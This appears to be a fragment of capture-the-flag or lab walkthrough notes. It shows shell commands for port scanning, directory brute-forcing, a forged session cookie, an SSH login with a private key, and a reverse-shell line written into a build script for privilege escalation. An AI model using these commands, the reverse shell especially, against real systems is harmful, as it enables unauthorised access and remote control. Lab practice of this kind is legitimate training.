...
```shell
rustscan -a 10.10.164.253 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.164.253 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

curl 'http://10.10.164.253' --cookie "SessionToken=something"
...
ssh james@10.10.164.253 -i id_rsa
...
echo "sh -i >& /dev/tcp/10.10.164.253/5555 0>&1" > buildscript.sh
